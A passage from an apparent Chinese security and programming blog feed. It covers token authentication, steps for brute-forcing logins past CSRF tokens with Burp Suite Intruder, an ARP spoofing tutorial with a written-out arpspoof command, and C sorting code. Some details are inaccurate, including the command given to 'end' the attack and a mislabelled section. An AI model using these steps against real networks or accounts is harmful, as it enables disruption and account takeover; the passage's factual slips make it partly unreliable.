        <content type="html"><![CDATA[<h1 id="token详解"><a href="#token详解" class="headerlink" title="token详解"></a>token详解</h1><h2 id="token是什么意思？"><a href="#token是什么意思？" class="headerlink" title="token是什么意思？"></a>token是什么意思？</h2><p>作为计算机术语时，是“令牌”的意思。Token是服务端生成的一串字符串，以作客户端进行请求的一个令牌，当第一次登录后，服务器生成一个Token便将此Token返回给客户端，以后客户端只需带上这个Token前来请求数据即可，无需再次带上用户名和密码。</p><p>token其实说的更通俗点可以叫暗号，在一些数据传输之前，要先进行暗号的核对，不同的暗号被授权不同的数据操作。说白了token是一个身份卡，有权限的作用。例如在USB1.1协议中定义了4类数据包：token包、data包、handshake包和special包。主机和USB设备之间连续数据的交换可以分为三个阶段，第一个阶段由主机发送token包，不同的token包内容不一样（暗号不一样）可以告诉设备做不同的工作，第二个阶段发送data包，第三个阶段由设备返回一个handshake包。</p><h2 id="token是用来干嘛的？"><a href="#token是用来干嘛的？" class="headerlink" title="token是用来干嘛的？"></a>token是用来干嘛的？</h2><p>使用token机制的身份验证方法，在服务器端不需要存储用户的登录记录。</p><p>大概的流程：</p><p>1️⃣ 客户端使用用户名和密码请求登录。</p><p>2️⃣ 服务端收到请求，验证用户名和密码。</p><p>3️⃣ 验证成功后，服务端会生成一个token，然后把这个token发送给客户端。</p><p>4️⃣ 客户端收到token后把它存储起来，可以放在cookie或者Local Storage（本地存储）里。</p><p>5️⃣ 客户端每次向服务端发送请求的时候都需要带上服务端发给的token。</p><p>6️⃣ 服务端收到请求，然后去验证客户端请求里面带着token，如果验证成功，就向客户端返回请求的数据。</p><h2 id="token的使用小结："><a href="#token的使用小结：" class="headerlink" title="token的使用小结："></a>token的使用小结：</h2><p>◾ 前端登陆的时候向服务器发送请求，服务器验证成功，会生成一个token</p><p>◾ 前端会存储这个token，放在session或cookie中，用于之后的业务请求身份验证</p><p>◾ 拿着这个token，可以在当前登录的账号下进行请求业务，发送请求时，token会放在请求头里，服务器收到这个业务请求，验证token，成功就允许这个请求获取数据</p><p>◾ token可以设置失效期</p><h2 id="token的加密"><a href="#token的加密" class="headerlink" title="token的加密"></a>token的加密</h2><p>token是很容易泄露的，如果不进行加密处理，很容易被恶意拷贝并用来登录。加密的方式一般有：</p><p>在存储的时候把token进行对称加密存储，用到的时候再解密。</p><p>文章最开始提到的签名sign：将请求URL、时间戳、token三者合并，通过算法进行加密处理。</p><p>最好是两种方式结合使用。</p><p>还有一点，在网络层面上token使用明文传输的话是非常危险的，所以一定要使用HTTPS协议。</p><h1 id="爆破工具-burpsuite"><a href="#爆破工具-burpsuite" class="headerlink" title="爆破工具 burpsuite"></a>爆破工具 burpsuite</h1><h2 id="burp-Suite的暴力破解（intruder）的-四种爆破模式："><a href="#burp-Suite的暴力破解（intruder）的-四种爆破模式：" class="headerlink" title="burp Suite的暴力破解（intruder）的 四种爆破模式："></a>burp Suite的暴力破解（intruder）的 四种爆破模式：</h2><p>Sniper（狙击手模式）：单点爆破模式，跟狙击手一样，每次只会对一个点进行参数爆破，当存在多个参数时，会对每个参数使用一个字典进行多次爆破，其余参数不变</p><p>Battering ram（攻城锤模式）：多点爆破模式，会同时对多个参数进行爆破，但是使用的时候用一个字典</p><p>Pichfork（草叉模式）：类似于Battering ram模式，但是使用的是多个字典，并且多个点的字典内容一一匹配进行爆破</p><p>Cluser bamb（集束炸弹模式）：多点爆破模式，会对不同点的内容采用多字典，进行笛卡尔乘积模式爆破</p><h2 id="对于token的绕过思路"><a href="#对于token的绕过思路" class="headerlink" title="对于token的绕过思路"></a>对于token的绕过思路</h2><p>token只是用来防御csrf（跨站请求攻击），但无法防止暴力破解。因为当将随机产生的token参数加入到请求包中时。每次请求攻击者只能够盗取到被攻击这的cookice而不能伪造当次请求的token，这是因为token是由服务器随机生成的，只有匹配当次的token，服务器才会与客户端进行连接，否则拒绝连接。而token无法防止暴力破解的原因是因为token是随机生成的，攻击者只要能够想办法获取到前端的token值即可进行暴力破解，所以我们在burp的Intruder中使用Grep-Extract模块得到token，然后在第二字典（payload2，用来上传token）选择Recursive grep，将筛选token的正则表达式导入，然后启用resource pool中的单线程进行爆破(需要自己在最下面创建一个单线程 值为 Maximum concurrent requests:1 Delaybetween requests：300)</p><h1 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h1><p>详细教程见<br><a href="https://blog.csdn.net/qq_45705626/article/details/127760165?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522168871286716800197083329%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=168871286716800197083329&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all">https://blog.csdn.net/qq_45705626/article/details/127760165?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522168871286716800197083329%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=168871286716800197083329&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all</a>~</p>]]></content>
      
      
      
        <tags>
            
            <tag> 爆破 </tag>
            
            <tag> burpsuite </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ARP攻击</title>
      <link href="/2023/07/04/arp%E6%94%BB%E5%87%BB/"/>
      <url>/2023/07/04/arp%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<h2 id="ARP攻击介绍"><a href="#ARP攻击介绍" class="headerlink" title="ARP攻击介绍"></a>ARP攻击介绍</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ARP（Address Resolution Protocol，地址解析协议）是一个位于TCP/IP协议栈中的底层协议，负责将某个IP地址解析成对应的MAC地址。而ARP攻击就是通过伪造IP地址和MAC地址实现ARP欺骗，能够在网络中产生大量的ARP通信量使网络阻塞，攻击者只要持续不断的发出伪造的ARP响应包就能更改目标主机ARP缓存中的IP-MAC条目，造成网络中断或中间人攻击。这是一种“中间人”（MAN-IN-MIDDLE）攻击技术。</span><br><span class="line">电脑遭受到典型的ARP攻击后会表现为：使用局域网时会突然掉线，过一段时间后又会恢复正常。比如客户端状态频频变红，用户频繁断网，IE浏览器频繁出错，以及一些常用软件出现故障等。如果局域网中是通过身份认证上网的，会突然出现可认证，但不能上网的现象（无法ping通网关），重启机器或在MS-DOS窗口下运行命令arp -d后，又可恢复上网。</span><br><span class="line">ARP欺骗木马只需成功感染一台电脑，就可能导致整个局域网都无法上网，严重的甚至可能带来整个网络的瘫痪。该木马发作时除了会导致同一局域网内的其他用户上网出现时断时续的现象外，还会窃取用户密码。如盗取QQ密码、盗取各种网络游戏密码和账号去做金钱交易，盗窃网上银行账号来做非法交易活动等</span><br></pre></td></tr></table></figure><h2 id="ARP攻击实战"><a href="#ARP攻击实战" class="headerlink" title="ARP攻击实战"></a>ARP攻击实战</h2><p>工具:  kali 中 ettercap</p><p>操作:</p><pre><code>使用ettercap中的搜素获得局域网内的目标，选中目标主机和网关作为目标，选择arp欺骗攻击。开始攻击后，网卡能够读取到目标主机的全部流量，可以使用wireshark进行抓包分析目标行为。</code></pre><p>我们也可以用 kali 中的 arpspoof命令来进行对目标机的断网攻击</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arpspoof -i eth0 -t 目标IP地址 网关              </span><br></pre></td></tr></table></figure><p>使用本命令解除攻击</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &#x27;echo 1 &gt; /proc/sys/net/ipv4/ip_forward&#x27;</span><br></pre></td></tr></table></figure><h2 id="ARP攻击检测"><a href="#ARP攻击检测" class="headerlink" title="ARP攻击检测"></a>ARP攻击检测</h2><p>检测：</p><p>1、网络频繁掉线</p><p>2、网速突然变慢</p><p>3、使用arp -a命令查看的网关mac地址与真实的网关mac地址不同</p><p>4、使用嗅探软件发现局域网内存在大量arp应答包</p><h2 id="ARP的防护"><a href="#ARP的防护" class="headerlink" title="ARP的防护"></a>ARP的防护</h2><p>在我们真实环境下的ARP攻击主要有三种：</p><p>1.攻击者的ip和MAC地址是真实的</p><p>2.攻击者伪造ip地址，但是正确的MAC地址</p><p>3.攻击者伪造ip地址和MAC地址</p><p>对于前两种手段，想要找到攻击的源主机还是比较容易的，第三种就有些麻烦。</p><p>日常防护:<br>1.在pc端上做ip和MAC地址的绑定</p><p>2.在网络设备层面可以做ip mac 和端口的绑定，限制端口只能学习一个MAC地址，也可以做AAA认证，可以提前录入MAC地址，当终端连接时先判断合法性</p><p>3.可以部署一些arp防御软件，有条件的可以部署些arp防护的设备</p><h2 id="ARP欺骗的危害"><a href="#ARP欺骗的危害" class="headerlink" title="ARP欺骗的危害"></a>ARP欺骗的危害</h2><p>1、使同一网段内其他用户无法上网</p><p>2、可以嗅探到交换式局域网中的所有数据包</p><p>3、对信息进行篡改</p><p>4、可以控制局域网内任何主机</p>]]></content>
      
      
      
        <tags>
            
            <tag> arp </tag>
            
            <tag> kali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>排序算法</title>
      <link href="/2023/06/10/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/"/>
      <url>/2023/06/10/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="排序算法（递增）（c语言）"><a href="#排序算法（递增）（c语言）" class="headerlink" title="排序算法（递增）（c语言）"></a>排序算法（递增）（c语言）</h1><p><img src="/img/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95%E6%80%BB%E7%BB%93%E8%A1%A8.png" alt="title"></p><p><img src="/img/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95%E6%80%BB%E7%BB%93%E8%A1%A81.png" alt="title"></p><h2 id="1-插入排序"><a href="#1-插入排序" class="headerlink" title="1.插入排序"></a>1.插入排序</h2><p>算法思想：每次将一个待排序的记录按其关键字大小插入到前面已排好序的子序列中直到全部记录插入完成</p><h3 id="1-直接插入排序"><a href="#1-直接插入排序" class="headerlink" title="1. 直接插入排序"></a>1. 直接插入排序</h3><p>插入排序（Insertion-Sort）的算法描述是一种简单直观的排序算法。它的工作原理是通过构建有序序列，对于未排序数据，在已排序序列中从后向前扫描，找到相应位置并插入。例如要将数组arr&#x3D;[4,2,8,0,5,1]排序，可以将4看做是一个有序序列，将[2,8,0,5,1]看做一个无序序列。无序序列中2比4小，于是将2插入到4的左边，此时有序序列变成了[2,4]，无序序列变成了[8,0,5,1]。无序序列中8比4大，于是将8插入到4的右边，有序序列变成了[2,4,8],无序序列变成了[0,5,1]。以此类推，最终数组按照从小到大排序。该算法的时间复杂度为O(n^2)。</p><p>插入排序算法的原理如下：</p><p>​ 1.从第一个元素开始，该元素可以认为已经被排序；</p><p>​ 2.取出下一个元素，在已经排序的元素序列中从后向前扫描；</p><p>​ 3.如果该元素（已排序）大于新元素，将该元素移到下一位置；</p><p>​ 4.重复步骤3，直到找到已排序的元素小于或者等于新元素的位置；</p><p>​ 5.将新元素插入到该位置后；</p><p>​ 6.重复步骤2~5。</p><p>算法实现:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">void InsertSort(int* arr, int len)&#123;</span><br><span class="line">int i, j, temp;</span><br><span class="line">for (i = 1; i &lt; len; i++) &#123;//将各元素插入已排好序的序列中</span><br><span class="line">if (arr[i] &lt; arr[i - 1]) &#123;//若A[i]关键字小于前驱</span><br><span class="line">temp = arr[i];                //用temp暂存A[i]</span><br><span class="line">for (j = i - 1; j &gt;= 0 &amp;&amp; arr[j] &gt; temp; j--)//检查所有前面已经排好序的元素</span><br><span class="line">arr[j + 1] = arr[j];//所有大于temp的元素都向后挪位</span><br><span class="line">arr[j + 1] = temp;//复制到插入位置</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="2-折半插入排序"><a href="#2-折半插入排序" class="headerlink" title="2. 折半插入排序"></a>2. 折半插入排序</h3><p>算法实现:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">void InsertSort_N(int arr[], int len) &#123;</span><br><span class="line">    int i, j, temp, low, high, mid;</span><br><span class="line">    for (i = 1; i &lt; len; ++i) &#123;             //依次将数组中arr[2]~arr[n]插入前面已经排序序列</span><br><span class="line">        temp = arr[i];                      //将arr[i]暂存在temp中</span><br><span class="line">        low = 0;                            //设置折半查找范围</span><br><span class="line">        high = i - 1;</span><br><span class="line">        while (low &lt;= high) &#123;               //折半查找（默认递增有序）</span><br><span class="line">            mid = (low + high) / 2;         //取中间点</span><br><span class="line">            if (arr[mid] &gt; temp)</span><br><span class="line">                high = mid - 1;             //查找右半子表</span><br><span class="line">            else</span><br><span class="line">                low = mid + 1;              //查左半子表</span><br><span class="line">        &#125;</span><br><span class="line">        for (j = i - 1; j &gt;= high + 1; --j)</span><br><span class="line">            arr[j + 1] = arr[j];            //依次后移元素，空出插入位</span><br><span class="line">        arr[high + 1] = temp;               //插入</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-希尔排序"><a href="#3-希尔排序" class="headerlink" title="3. 希尔排序"></a>3. 希尔排序</h3><p>希尔排序：​希尔排序是对插入排序的优化，基本思路是先选定一个整数作为增量，把待排序文件中的所有数据分组，以每个距离的等差数列为一组，对每一组进行排序，然后将增量缩小，继续分组排序，重复上述动作，直到增量缩小为1时，排序完正好有序。</p><p>​希尔排序原理是每一对分组进行排序后，整个数据就会更接近有序，当增量缩小为1时，就是插入排序，但是现在的数组非常接近有序，移动的数据很少，所以效率非常高，所以希尔排序又叫缩小增量排序。</p><p>​每次排序让数组接近有序的过程叫做预排序，最后一次插入是直接插入排序</p><p>算法实现:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">void ShellSort(int* arr, int n)</span><br><span class="line">&#123;</span><br><span class="line">int gap = n;</span><br><span class="line">while (gap&gt;1)</span><br><span class="line">&#123;</span><br><span class="line">//每次对gap折半操作</span><br><span class="line">gap = gap / 2;</span><br><span class="line">//单趟排序</span><br><span class="line">for (int i = 0; i &lt; n - gap; ++i)</span><br><span class="line">&#123;</span><br><span class="line">int end = i;</span><br><span class="line">int tem = arr[end + gap];</span><br><span class="line">while (end &gt;= 0)</span><br><span class="line">&#123;</span><br><span class="line">if (tem &lt; arr[end])</span><br><span class="line">&#123;</span><br><span class="line">arr[end + gap] = arr[end];</span><br><span class="line">end -= gap;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">arr[end + gap] = tem;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-交换排序"><a href="#2-交换排序" class="headerlink" title="2.交换排序"></a>2.交换排序</h2><h3 id="1-冒泡排序"><a href="#1-冒泡排序" class="headerlink" title="1. 冒泡排序"></a>1. 冒泡排序</h3><p>​冒泡排序（Bubble Sort）也是一种简单直观的排序算法。假设长度为n的数组arr，要按照从小到大排序。则冒泡排序的具体过程可以描述为：首先从数组的第一个元素开始到数组最后一个元素为止，对数组中相邻的两个元素进行比较，如果位于数组左端的元素大于数组右端的元素，则交换这两个元素在数组中的位置。这样操作后数组最右端的元素即为该数组中所有元素的最大值。接着对该数组除最右端的n-1个元素进行同样的操作，再接着对剩下的n-2个元素做同样的操作，直到整个数组有序排列。</p><p>冒泡排序算法的原理如下：</p><p>比较相邻的元素。如果第一个比第二个大，就交换他们两个。</p><p>对每一对相邻元素做同样的工作，从开始第一对到结尾的最后一对。在这一点，最后的元素应该会是最大的数。</p><p>针对所有的元素重复以上的步骤，除了最后一个。</p><p>持续每次对越来越少的元素重复上面的步骤，直到没有任何一对数字需要比较。</p><p>算法实现:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">void bubble_Sort(int* a, int n)</span><br><span class="line">&#123;</span><br><span class="line">int i = 0，j = 0，flag = 0，temp;       //flag表示本趟冒泡是否发生交换的标志</span><br><span class="line">for (i = 0; i &lt; n - 1; i++)//趟数</span><br><span class="line">&#123;</span><br><span class="line">for (j = 0; j &lt; n - 1 - i; j++)    //相邻元素之间的比较次数</span><br><span class="line">&#123;</span><br><span class="line">if (a[j + 1] &lt; a[j])           //若为逆序</span><br><span class="line">&#123;</span><br><span class="line">temp = a[j+1];           //交换</span><br><span class="line">a[j+1] = a[j];</span><br><span class="line">a[j] = temp;</span><br><span class="line">flag = 1;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">if (flag == 0)</span><br><span class="line">&#123;</span><br><span class="line">break;              //本趟遍历后没有发生交换，说明表已经有序</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-快速排序"><a href="#2-快速排序" class="headerlink" title="2. 快速排序"></a>2. 快速排序</h3><p>基本思想为:<br>任取待排序元素中的某元素作为基准值pivot，按照该基准值将带排序序列分为两个子序列，左边子序列的值都小于基准值，右边则都大于基准值，然后左右序列重复该过程（递归），直到所有元素都排列在相遇的位置上为止。</p><p>算法实现:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">//用第一个元素将待排序序列划分成左右两个部分</span><br><span class="line">int Partition(int A[],int low,int high)&#123;</span><br><span class="line">int pivot = A[low];</span><br><span class="line">while(low&lt;high)&#123;</span><br><span class="line">while(low&lt;high&amp;&amp;A[high]&gt;=pivot)&#123;</span><br><span class="line">high--;</span><br><span class="line">&#125;</span><br><span class="line">A[low] = A[high];</span><br><span class="line">while(low&lt;high&amp;&amp;A[low]&lt;=pivot)&#123;</span><br><span class="line">low++;</span><br><span class="line">&#125;</span><br><span class="line">A[high] = A[low];</span><br><span class="line">&#125;</span><br><span class="line">A[low] = pivot;</span><br><span class="line">return low;</span><br><span class="line">&#125;</span><br><span class="line">//快速排序</span><br><span class="line">void QuickSort(int A[],int low,int high)&#123;</span><br><span class="line">if(low&lt;high)&#123;     //递归跳出的条件</span><br><span class="line">int pivotpos = Partition(A,low,high); //划分</span><br><span class="line">QuickSort(A,low,pivotpos-1);</span><br><span class="line">QuickSort(A,pivotpos+1,high);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="选择排序"><a href="#选择排序" class="headerlink" title="选择排序"></a>选择排序</h2><h3 id="1-简单选择排序"><a href="#1-简单选择排序" class="headerlink" title="1. 简单选择排序"></a>1. 简单选择排序</h3><p>选择排序是一种简单直观的排序算法，无论什么数据进去都是 O(n²) 的时间复杂度。所以用到它的时候，数据规模越小越好。唯一的好处可能就是不占用额外的内存空间了吧。具体来说，假设长度为n的数组arr，要按照从小到大排序，那么先从n个数字中找到最小值min1，如果最小值min1的位置不在数组的最左端(也就是min1不等于arr[0])，则将最小值min1和arr[0]交换，接着在剩下的n-1个数字中找到最小值min2，如果最小值min2不等于arr[1]，则交换这两个数字，依次类推，直到数组arr有序排列。算法的时间复杂度为O(n^2)。</p><p>选择排序算法的原理如下：</p><p>​ 1.首先在未排序序列中找到最小（大）元素，存放到排序序列的起始位置。</p><p>​ 2.再从剩余未排序元素中继续寻找最小（大）元素，然后放到已排序序列的末尾。</p><p>​ 3.重复第二步，直到所有元素均排序完毕。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">// 自定义方法：交换两个变量的值</span><br><span class="line">void swap(int *a,int *b) </span><br><span class="line">&#123;</span><br><span class="line">    int temp = *a;</span><br><span class="line">    *a = *b;</span><br><span class="line">    *b = temp;</span><br><span class="line">&#125;</span><br><span class="line">/* 选择排序 */</span><br><span class="line">void selection_sort(int arr[], int len)</span><br><span class="line">&#123;</span><br><span class="line">    int i,j;</span><br><span class="line">    for (i = 0 ; i &lt; len - 1 ; i++) &#123;</span><br><span class="line">        int min = i;</span><br><span class="line">        for (j = i + 1; j &lt; len; j++) &#123;    //  遍历未排序的元素</span><br><span class="line">            if (arr[j] &lt; arr[min]) &#123;     //  找到目前最小值下标j</span><br><span class="line">                min = j;      //  记录最小值小标</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        swap(&amp;arr[min], &amp;arr[i]);       //做交换</span><br><span class="line">        /*  </span><br><span class="line">不用自定义函数时可以用选择下面方式进行交换</span><br><span class="line">temp = arr[min];</span><br><span class="line">        arr[min] = arr[i];</span><br><span class="line">        arr[i] = temp;</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="2-堆排序"><a href="#2-堆排序" class="headerlink" title="2. 堆排序"></a>2. 堆排序</h3><p>堆排序（Heapsort）是指利用堆这种数据结构所设计的一种排序算法。堆积是一个近似完全二叉树的结构，并同时满足堆积的性质：即子结点的键值或索引总是小于（或者大于）它的父节点。堆排序可以说是一种利用堆的概念来排序的选择排序。分为两种方法：每个结点的值都大于等于其左右孩子结点的值，称为大顶堆；或者每个结点的值都小于等于其左右孩子结点的值，称为小顶堆。该算法时间复杂度为O(n log n)。</p><p>堆排序算法的原理如下：</p><p>​ 1.将初始待排序关键字序列(R1,R2….Rn)构建成大顶堆，此堆为初始的无序区；</p><p>​ 2.将堆顶元素R[1]与最后一个元素R[n]交换，此时得到新的无序区(R1,R2,……Rn-1)和新的有序区(Rn),且满足R[1,2…n-1]&lt;&#x3D;R[n]；</p><p>​ 3.由于交换后新的堆顶R[1]可能违反堆的性质，因此需要对当前无序区(R1,R2,……Rn-1)调整为新堆，然后再次将R[1]与无序区最后一个元素交换，得到新的无序区(R1,R2….Rn-2)和新的有序区(Rn-1,Rn)。不断重复此过程直到有序区的元素个数为n-1，则整个排序过程完成。</p><p>代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">void swap(int* a, int* b)&#123;//交换函数</span><br><span class="line">int temp;</span><br><span class="line">temp = *b;</span><br><span class="line">*b = *a;</span><br><span class="line">*a = temp;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">// 下标为i的节点的父节点下标:(i-1)/2</span><br><span class="line">// 下标为i的节点的左孩子下标:i*2+1</span><br><span class="line">// 下标为i的节点的右孩子下标:i*2+2</span><br><span class="line">void Heapify(int arr[], int n, int i) &#123;  //维护堆的性质 arr:存储堆的数组 n:数组长度 i:待维护节点的下标</span><br><span class="line">int largest = i;</span><br><span class="line">int lson = i * 2 + 1;</span><br><span class="line">int rson = i * 2 + 2;</span><br><span class="line"></span><br><span class="line">if (lson &lt; n &amp;&amp; arr[largest] &lt; arr[lson]) //子节点下标不能超出n，如果存在子节点大于父节点，就把最大子节点下标赋给largest</span><br><span class="line">largest = lson;</span><br><span class="line">if (rson &lt; n &amp;&amp; arr[largest] &lt; arr[rson])</span><br><span class="line">largest = rson;</span><br><span class="line">if (largest != i) &#123;</span><br><span class="line">swap(&amp;arr[largest], &amp;arr[i]); //交换子节点和父节点</span><br><span class="line">Heapify(arr, n, largest); //递归维护子节点</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void Heapsort(int arr[], int n) &#123;</span><br><span class="line">int i;</span><br><span class="line">//建堆</span><br><span class="line">for (i = ((n - 1) - 1) / 2; i &gt;= 0; i--) &#123;</span><br><span class="line">Heapify(arr, n, i);</span><br><span class="line">&#125;</span><br><span class="line">for (i = n - 1; i &gt; 0; i--) &#123;</span><br><span class="line">swap(&amp;arr[i], &amp;arr[0]);//将排好序的放到数组最后面</span><br><span class="line">Heapify(arr, i, 0);//维护堆顶</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="归并排序"><a href="#归并排序" class="headerlink" title="归并排序"></a>归并排序</h2><p>​归并排序是建立在归并操作上的一种有效的排序算法。该算法是采用分治法（Divide and Conquer）的一个非常典型的应用。将已有序的子序列合并，得到完全有序的序列；即先使每个子序列有序，再使子序列段间有序。代价是需要额外的内存空间。若将两个有序表合并成一个有序表，称为2-路归并。 该算法时间复杂度为O(n log n)。</p><p>希尔排序算法的原理如下：</p><p>​1.把长度为n的输入序列分成两个长度为n&#x2F;2的子序列；</p><p>​2.对这两个子序列分别采用归并排序；</p><p>​3.将两个排序好的子序列合并成一个最终的排序序列。</p><p>代码实现如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span 